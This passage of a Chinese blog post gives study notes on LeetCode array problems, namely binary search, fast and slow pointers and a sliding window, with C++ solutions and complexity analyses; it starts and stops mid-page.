class="hljs-keyword">if</span>(nums[mid]&lt;target)<br>            &#123;<br>                left = mid + <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> mid;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>结果：<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz55dwxoh8j30r005ydge.jpg" alt="image-20220207105826044"></p><h4 id="35-查找插入位置"><a href="#35-查找插入位置" class="headerlink" title="35. 查找插入位置"></a><a href="https://leetcode-cn.com/problems/search-insert-position/description/">35. 查找插入位置</a></h4><p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p><p>请必须使用时间复杂度为 <code>O(log n)</code> 的算法。</p><ul><li>nums是无重复元素的升序数组。</li></ul><p>思路：在元素存在的情况下与上一题相同，所以只需要再考虑元素不存在的情况。考虑上一题的程序，最后的<code>else</code>就不能用了，不然会返回答案两边。最后的<code>return -1</code>也需要修改，最终运行到<code>left=right</code>时，如果目标值存在，左右都是目标，如果目标不存在，<code>mid=left=right</code>如果目标大于<code>nums[left]</code>则<code>left=left+1=right+1</code>就是<code>left</code>右侧第一个，这时<code>left&gt;right</code>推出循环，返回<code>left</code>；如果目标小于<code>nums[left]</code>则<code>right=right-1=left-1</code>就是left左边一个，此时插入位置仍为<code>left</code>所以同样返回<code>left</code>。代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">searchInsert</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>       <span class="hljs-type">short</span> n = nums.<span class="hljs-built_in">size</span>();<br>       <span class="hljs-type">short</span> l=<span class="hljs-number">0</span>,r=n<span class="hljs-number">-1</span>;<br>       <span class="hljs-keyword">while</span>(l&lt;=r)&#123;<br>           <span class="hljs-type">short</span> mid=l+(r-l)/<span class="hljs-number">2</span>;<br>           <span class="hljs-keyword">if</span>(nums[mid]&lt;target)<br>               l=mid+<span class="hljs-number">1</span>;<br>           <span class="hljs-keyword">else</span> r=mid<span class="hljs-number">-1</span>;<br>       &#125;<br>       <span class="hljs-keyword">return</span> l;<br>   &#125;<br></code></pre></td></tr></table></figure><p>结果：时间复杂度：<code>O(logn)</code>，空间复杂度：<code>O(1)</code><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz5fc5ldp8j30ra06o0tb.jpg" alt="image-20220207164239519"></p><h4 id="34-在排序数组中查找元素的第一个和最后一个位置"><a href="#34-在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="34. 在排序数组中查找元素的第一个和最后一个位置"></a>34. <a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/">在排序数组中查找元素的第一个和最后一个位置</a></h4><p>给定一个按照升序排列的整数数组 nums，和一个目标值 target。找出给定目标值在数组中的开始位置和结束位置。</p><p>如果数组中不存在目标值 target，返回 [-1, -1]。</p><p>进阶：</p><p>你可以设计并实现时间复杂度为 O(log n) 的算法解决此问题吗？</p><p>思路一：遍历法，找到后开始计数。时间复杂度<code>O(n)</code>，最坏情况为都是target。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">searchRange</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> first, last;<br>        <span class="hljs-keyword">if</span>(nums.<span class="hljs-built_in">empty</span>()) <span class="hljs-keyword">return</span> &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>&#125;;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> iter = <span class="hljs-number">0</span>;iter&lt;nums.<span class="hljs-built_in">size</span>();iter++) &#123;<br>            <span class="hljs-keyword">if</span>(nums[iter]==target) &#123;<span class="hljs-comment">//找到target</span><br>                first = iter;<br>                last = iter;<br>                <span class="hljs-keyword">while</span>((last+<span class="hljs-number">1</span>&lt;=nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>) &amp;&amp; (nums[last+<span class="hljs-number">1</span>] == nums[first])) &#123;<br>                    last++; <span class="hljs-comment">//这里要注意条件不要使得数组越界</span><br>                &#125;<br>                <span class="hljs-keyword">return</span> &#123;first, last&#125;;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>&#125;; <span class="hljs-comment">//没找到</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>结果：竟然还不错<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz5gervovzj30rg06yq3g.jpg" alt="image-20220207171954179"></p><p>思路二：二分查找，想法是二分的<code>left</code>和<code>right</code>分别定位到target出现的第一个和最后一个的位置，可以在每次产生新的<code>mid</code>后，分别在其左右再进行二分查找，最终找到最边上的两个target，即为<code>left, right</code>。</p><h4 id="69-x-的平方根"><a href="#69-x-的平方根" class="headerlink" title="69.x 的平方根"></a><a href="https://leetcode-cn.com/problems/sqrtx/">69.x 的平方根</a></h4><p>给你一个非负整数 x ，计算并返回 x 的 算术平方根 。</p><p>由于返回类型是整数，结果只保留整数部分 ，小数部分将被舍去 。</p><p>注意：不允许使用任何内置指数函数和算符，例如 pow(x, 0.5) 或者 x ** 0.5 。</p><p>简单思路：循环。时间复杂度：<code>O(n)</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">mySqrt</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(x == <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br>        <span class="hljs-keyword">if</span>(x == <span class="hljs-number">1</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<br>        <span class="hljs-type">int</span> num = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(x / num &gt;= num)&#123;<br>            <span class="hljs-keyword">if</span>(x/(num+<span class="hljs-number">1</span>) &lt; (num+<span class="hljs-number">1</span>))<br>            &#123;<span class="hljs-keyword">return</span> num;&#125;<br>            num++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> num;<br>    &#125;<br></code></pre></td></tr></table></figure><p>二分法：。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">mySqrt</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(x == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(x == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<span class="hljs-comment">//单独处理，否则会出现除数为0</span><br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> right = x ;<br>        <span class="hljs-keyword">while</span> (left&lt;=right) <br>        &#123;<br>             <span class="hljs-type">int</span> mid = left + ((right - left) / <span class="hljs-number">2</span>);<br>             <span class="hljs-keyword">if</span>(x/mid &gt; mid) &#123; <span class="hljs-comment">//避免溢出</span><br>                 left = mid + <span class="hljs-number">1</span>;<br>             &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x/mid &lt; mid) &#123;<br>                 right = mid - <span class="hljs-number">1</span>;<br>             &#125; <span class="hljs-keyword">else</span> &#123;<br>                 <span class="hljs-keyword">return</span> mid; <span class="hljs-comment">//正好是mid的平方</span><br>             &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> left - <span class="hljs-number">1</span>; <span class="hljs-comment">//left是找到的第一个大于的sqrt（x）的值，所以要返回left-1</span><br>        <br>    &#125;<br></code></pre></td></tr></table></figure><p>结果：时间复杂度：<code>O(logn)</code>，空间复杂度：<code>O(1)</code><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz5o6i6xxzj30ry05q3z1.jpg" alt="image-20220207214842960"></p><h4 id="367-有效的完全平方数"><a href="#367-有效的完全平方数" class="headerlink" title="367. 有效的完全平方数"></a><a href="https://leetcode-cn.com/problems/valid-perfect-square/">367. 有效的完全平方数</a></h4><p>给定一个 正整数 num ，编写一个函数，如果 num 是一个完全平方数，则返回 true ，否则返回 false 。</p><p>进阶：不要 使用任何内置的库函数，如  sqrt 。</p><p>这一题和上一题基本一样，只需要根据题意做一些小小的修改即可。需要注意的点是，由于为了避免溢出判断时候使用除法而非乘法，就导致可能会出现5&#x2F;2&#x3D;2这种情况，所以需要多判断一下。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPerfectSquare</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(num == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">if</span>(num == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<span class="hljs-comment">//单独处理，否则会出现除数为0</span><br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> right = num ;<br>        <span class="hljs-keyword">while</span> (left&lt;=right) <br>        &#123;<br>             <span class="hljs-type">int</span> mid = left + ((right - left) / <span class="hljs-number">2</span>);<br>             <span class="hljs-keyword">if</span>(num/mid &gt; mid) &#123; <span class="hljs-comment">//避免溢出</span><br>                 left = mid + <span class="hljs-number">1</span>;<br>             &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(num/mid &lt; mid) &#123;<br>                 right = mid - <span class="hljs-number">1</span>;<br>             &#125; <span class="hljs-keyword">else</span> &#123;<br>                 <span class="hljs-keyword">if</span>(num/mid != (num<span class="hljs-number">-1</span>)/mid) &#123;<span class="hljs-comment">//这里要注意，由于整数除法向下取整，不判断会有问题</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">//正好是mid的平方</span><br>                 &#125;<br>                 <br>                 <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>             &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>结果：时间复杂度：<code>O(logn)</code>，空间复杂度：<code>O(1)</code></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz5pf6xgsuj30ty05umxo.jpg" alt="image-20220207223140439"></p><h3 id="2-移除元素"><a href="#2-移除元素" class="headerlink" title="2. 移除元素"></a>2. 移除元素</h3><h4 id="27-移除元素"><a href="#27-移除元素" class="headerlink" title="27. 移除元素"></a><a href="https://leetcode-cn.com/problems/remove-element/">27. 移除元素</a></h4><p>给你一个数组 nums 和一个值 val，你需要 原地 移除所有数值等于 val 的元素，并返回移除后数组的新长度。</p><p>不要使用额外的数组空间，你必须仅使用 O(1) 额外空间并 原地 修改输入数组。</p><p>元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。</p><p>思路：实际上不用改变数组的长度，只需要把要移除的元素放到最后即可。</p><p>方法一：暴力算法，双循环，循环数组，找到target后循环将其之后的数都往前移一位。<code>O(n^2)</code></p><p>方法二：快慢指针，是常用的一种用一个循环就可以完成双循环工作的思路。快指针完整遍历数组，慢指针为最终剩余元素数。开始时，快慢指针都指向数组头，在没有遇到目标时，快慢指针同时增加；当遇到目标时，快指针继续向前，慢指针不动，并将自己所指元素指向快指针所指元素。继续向后，如果没有遇到目标，快慢指针同时增加，且若快慢指针不想等，就将慢指针值改为快指针。若遇到目标，慢指针不动，快指针增加，以此类推，当快指针遍历数组后，慢指针指向元素即为新的数组边界。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">removeElement</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-type">int</span> slowIndex = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> fastIndex = <span class="hljs-number">0</span>; fastIndex&lt;nums.<span class="hljs-built_in">size</span>(); fastIndex++) &#123;<br>            <span class="hljs-keyword">if</span>(val != nums[fastIndex]) &#123;<span class="hljs-comment">//只有快指针指向的不是目标时慢指针增加。</span><br>                nums[slowIndex] = nums[fastIndex];<br>                slowIndex++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> slowIndex;<br>    &#125;<br></code></pre></td></tr></table></figure><p>结果：时间复杂度：O(n)，空间复杂度：O(1)</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6vdldovwj30rk05omxp.jpg" alt="image-20220208224316153"></p><h4 id="26-删除排序数组中的重复项"><a href="#26-删除排序数组中的重复项" class="headerlink" title="26.删除排序数组中的重复项"></a><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array/description/">26.删除排序数组中的重复项</a></h4><p>给你一个有序数组 nums ，请你 原地 删除重复出现的元素，使每个元素 只出现一次 ，返回删除后数组的新长度。</p><p>不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 <code>O(1)</code> 额外空间的条件下完成。</p><ul><li>nums升序排列</li></ul><p>思路：重点就是nums按升序排列，不然一定会需要<code>O(n)</code>的空间来存放每一个出现过的元素。利用上一题的快慢指针法，初始状态：快指针指向第二个元素，慢指针指向第一个元素。如果快指针的值等于慢指针，快指针右移，慢指针不动。若不等，慢指针右移，所指等于快指针，快指针右移。缺点：需要单独处理数组长度为0和1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">removeDuplicates</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> slowIndex = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(nums.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(nums.<span class="hljs-built_in">empty</span>()) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> fastIndex = <span class="hljs-number">1</span>;fastIndex&lt;nums.<span class="hljs-built_in">size</span>();fastIndex++) &#123;<br>            <span class="hljs-keyword">if</span>(nums[slowIndex] != nums[fastIndex]) &#123;<br>                slowIndex++;<br>                nums[slowIndex] = nums[fastIndex];<br>            &#125; <br>        &#125;<br>        <span class="hljs-keyword">return</span> slowIndex + <span class="hljs-number">1</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>结果：时间复杂度<code>O(n)</code>，空间复杂度<code>O(1)</code>。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6wj30eqhj30se05ujrz.jpg" alt="image-20220208232309980"></p><h4 id="283-移动零"><a href="#283-移动零" class="headerlink" title="283.移动零"></a><a href="https://leetcode-cn.com/problems/move-zeroes/">283.移动零</a></h4><p>给定一个数组 <code>nums</code>，编写一个函数将所有 <code>0</code> 移动到数组的末尾，同时保持非零元素的相对顺序。</p><p><strong>请注意</strong> ，必须在不复制数组的情况下原地对数组进行操作。</p><p>思路：由于要把0移动到最后，一个想法是使用两个指针，一个从前遍历数组，一个在后面做置换。当左指针指向0时，如果右指针不为零则可以直接交换，如果不为0则右指针向左移一位，直到左指针等于右指针时整个数组都被遍历且0都被转移到最右侧。但是结果需要保持顺序所以此想法不成立，那就继续用快慢指针。由于需要移动0，所以将非0数移到左边后，只需要把剩下的元素赋值为0即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">moveZeroes</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> slow = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> fast=<span class="hljs-number">0</span>;fast&lt;nums.<span class="hljs-built_in">size</span>();fast++) &#123;<br>            <span class="hljs-keyword">if</span>(nums[fast] != <span class="hljs-number">0</span>) &#123;<br>                nums[slow] = nums[fast];<br>                slow++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> iter = slow;iter &lt;nums.<span class="hljs-built_in">size</span>();iter++) &#123;<br>            nums[iter] =<span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>结果：复杂度：<code>O(n)</code>,<code>O(1)</code></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6xjgfufzj30s205eq3h.jpg" alt="image-20220208235807303"></p><h4 id="844-比较含退格的字符串"><a href="#844-比较含退格的字符串" class="headerlink" title="844.比较含退格的字符串"></a><a href="https://leetcode-cn.com/problems/backspace-string-compare/description/">844.比较含退格的字符串</a></h4><p>给定 s 和 t 两个字符串，当它们分别被输入到空白的文本编辑器后，请你判断二者是否相等。# 代表退格字符。</p><p>如果相等，返回 true ；否则，返回 false 。</p><p>注意：如果对空文本输入退格字符，文本继续为空。</p><p>思路：这一题看起来很新颖，仔细想一下其实就是上面题的变型，思路也很简单，仍然使用快慢指针法，快指针遍历字符串，慢指针遇到#就回退（注意越界）。最终得到manzhizhen</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">string <span class="hljs-title">procString</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> right=<span class="hljs-number">0</span>;right&lt;s.<span class="hljs-built_in">size</span>();right++) &#123;<br>           <span class="hljs-keyword">if</span>(s[right] == <span class="hljs-string">&#x27;#&#x27;</span>) &#123;<br>               s.<span class="hljs-built_in">erase</span>(right,<span class="hljs-number">1</span>);<br>               <span class="hljs-keyword">if</span>(right == <span class="hljs-number">0</span>) right--;<br>               <span class="hljs-keyword">if</span>(right<span class="hljs-number">-1</span>&gt;=<span class="hljs-number">0</span>) &#123;<br>                   s.<span class="hljs-built_in">erase</span>(right<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>);<br>                   right = right  - <span class="hljs-number">2</span>;<br>               &#125;<br>           &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> s;<br>&#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">backspaceCompare</span><span class="hljs-params">(string s, string t)</span> </span>&#123;<br>        s = <span class="hljs-built_in">procString</span>(s);<br>        t = <span class="hljs-built_in">procString</span>(t);<br>        <span class="hljs-keyword">return</span> s==t;<br><br>        &#125;<br></code></pre></td></tr></table></figure><p>结果：复杂度：<code>O(n),O(1)</code></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz7v4bt6wfj30qy068jrw.jpg" alt="image-20220209191953891"></p><h3 id="4-有序数组的平方"><a href="#4-有序数组的平方" class="headerlink" title="4. 有序数组的平方"></a>4. 有序数组的平方</h3><h4 id="977-有序数组的平方-Easy"><a href="#977-有序数组的平方-Easy" class="headerlink" title="977.有序数组的平方 Easy"></a><a href="https://leetcode-cn.com/problems/squares-of-a-sorted-array/description/">977.有序数组的平方 Easy</a></h4><p>给你一个按 <strong>非递减顺序</strong> 排序的整数数组 <code>nums</code>，返回 <strong>每个数字的平方</strong> 组成的新数组，要求也按 <strong>非递减顺序</strong> 排序。</p><p>思路：最简单的想法就是先每个数平方，然后排序。这样的复杂度大约是<code>O(n+nlogn)</code>（如果用快排）。由于nums是有序的，所以最大值只能出现在数组的两边，利用这个信息我们就可以使用双指针法来解决。如果左右的任意一边的平方大于另一边，则大的那边往中间移动，小的那边不动，将大的那边的平方放入新数组右侧。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sortedSquares</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sorted</span><span class="hljs-params">(nums.size())</span></span>;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(left&lt;=right) &#123;<span class="hljs-comment">//相等也需要考虑，相等时为最后一个数</span><br>            <span class="hljs-type">int</span> leftSquare = nums[left]*nums[left];<br>            <span class="hljs-type">int</span> rightSquare = nums[right]*nums[right];<br>            <span class="hljs-keyword">if</span>(leftSquare&gt;rightSquare) &#123;<br>                sorted[n] = leftSquare;<br>                left++;<br>                n--;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                sorted[n] = rightSquare;<br>                right--;<br>                n--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sorted;<br>    &#125;<br></code></pre></td></tr></table></figure><p>结果：复杂度：<code>O(n),O(n)</code></p><h3 id="5-长度最小的数组"><a href="#5-长度最小的数组" class="headerlink" title="5. 长度最小的数组"></a>5. 长度最小的数组</h3><h4 id="209-长度最小的子数组-Medium"><a href="#209-长度最小的子数组-Medium" class="headerlink" title="209.长度最小的子数组 Medium"></a><a href="https://leetcode-cn.com/problems/minimum-size-subarray-sum/">209.长度最小的子数组 Medium</a></h4><p>给定一个含有 n 个正整数的数组和一个正整数 target 。</p><p>找出该数组中满足其和 ≥ target 的长度最小的 连续子数组 [numsl, numsl+1, …, numsr-1, numsr] ，并返回其长度。如果不存在符合条件的子数组，返回 0 。</p><p>思路：这一题又是一个重要思路：滑动窗口法，看起来很像双指针，<strong>就是不断的调节子序列的起始位置和终止位置，从而得出我们要想的结果</strong>。当窗口满足要求时，记录子串长度和</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minSubArrayLen</span><span class="hljs-params">(<span class="hljs-type">int</span> target, vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> result = __INT32_MAX__;<br>        <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; <span class="hljs-comment">//窗口左侧</span><br>        <span class="hljs-type">int</span> subSum = <span class="hljs-number">0</span>; <span class="hljs-comment">//子串和</span><br>        <span class="hljs-type">int</span> subLen = <span class="hljs-number">0</span>; <span class="hljs-comment">//子串长度</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;nums.<span class="hljs-built_in">size</span>();j++) &#123;<br>            subSum += nums[j];<br>            <span class="hljs-keyword">while</span>(subSum &gt;= target) &#123;<br>                subLen = (j - i + <span class="hljs-number">1</span>); <span class="hljs-comment">//获取当前子串长度</span><br>                result = result &lt; subLen ? result : subLen;<br>                subSum -= nums[i]; <span class="hljs-comment">//去掉窗口左侧元素</span><br>                i++; <span class="hljs-comment">//左侧右移</span><br>                <span class="hljs-comment">//可以写成一句：subSum -= nums[i++];</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//如果result没有被改变则返回0</span><br>        <span class="hljs-keyword">return</span> result == __INT32_MAX__ ? <span class="hljs-number">0</span> : result;<br>    &#125;<br></code></pre></td></tr></table></figure><p>本题收获：</p><ul><li>滑动窗口思想。</li><li>使用MAX赋值进行最后的输出判断。</li><li>命令组合（其实也没必要，可读性更重要）</li></ul><h4 id="904-水果成篮"><a href="#904-水果成篮" class="headerlink" title="904. 水果成篮"></a><a href="https://leetcode-cn.com/problems/fruit-into-baskets/">904. 水果成篮</a></h4><p>你正在探访一家农场，农场从左到右种植了一排果树。这些树用一个整数数组 fruits 表示，其中 fruits[i] 是第 i 棵树上的水果 种类 。</p><p>你想要尽可能多地收集水果。然而，农场的主人设定了一些严格的规矩，你必须按照要求采摘水果：</p><p>你只有 两个 篮子，并且每个篮子只能装 单一类型 的水果。每个篮子能够装的水果总量没有限制。<br>你可以选择任意一棵树开始采摘，你必须从 每棵 树（包括开始采摘的树）上 恰好摘一个水果 。采摘的水果应当符合篮子中的水果类型。每采摘一次，你将会向右移动到下一棵树，并继续采摘。<br>一旦你走到某棵树前，但水果不符合篮子的水果类型，那么就必须停止采摘。<br>给你一个整数数组 fruits ，返回你可以收集的水果的 最大 